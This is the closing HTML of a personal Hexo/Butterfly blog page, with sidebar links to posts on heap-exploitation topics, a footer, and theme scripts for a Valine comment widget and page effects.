src="https://ftp.bmp.ovh/imgs/2021/06/373b822d88c4973e.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="初识IO-FILE"/></a><div class="content"><a class="title" href="/2021/07/25/%E5%88%9D%E8%AF%86IO-FILE/" title="初识IO-FILE">初识IO-FILE</a><time datetime="2021-07-25T14:54:33.000Z" title="发表于 2021-07-25 22:54:33">2021-07-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/14/House-of-Rabbit/" title="House_of_Rabbit"><img src="https://ftp.bmp.ovh/imgs/2021/07/4240c846ca572854.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="House_of_Rabbit"/></a><div class="content"><a class="title" href="/2021/07/14/House-of-Rabbit/" title="House_of_Rabbit">House_of_Rabbit</a><time datetime="2021-07-14T02:06:32.000Z" title="发表于 2021-07-14 10:06:32">2021-07-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/10/how2heap%E4%B9%8BHouse_of_Roman/" title="how2heap之House_of_Roman"><img src="https://ae01.alicdn.com/kf/U01d4ba5a6f0a460496eb5cc2ca9599b7E.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="how2heap之House_of_Roman"/></a><div class="content"><a class="title" href="/2021/07/10/how2heap%E4%B9%8BHouse_of_Roman/" title="how2heap之House_of_Roman">how2heap之House_of_Roman</a><time datetime="2021-07-10T04:33:41.000Z" title="发表于 2021-07-10 12:33:41">2021-07-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By aYoung</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    let initData = {
+      el: '#vcomment',
+      appId: 'L7cFgIQhurvmmSexryctex39-MdYXbMMI',
+      appKey: 'EG1BbRP3FTdnTfn0QeeeIDii',
+      placeholder: 'Please leave your footprints',
+      avatar: 'robohash',
+      meta: 'nick/mail/link'.split(','),
+      pageSize: '10',
+      avatar_cdn: 'https://www.gravatar.com/avatar/',
+      lang: 'zh-CN',
+      recordIP: true,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: true,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick/mail'.split(','))
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign(initData, otherData)
+    }
+    
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
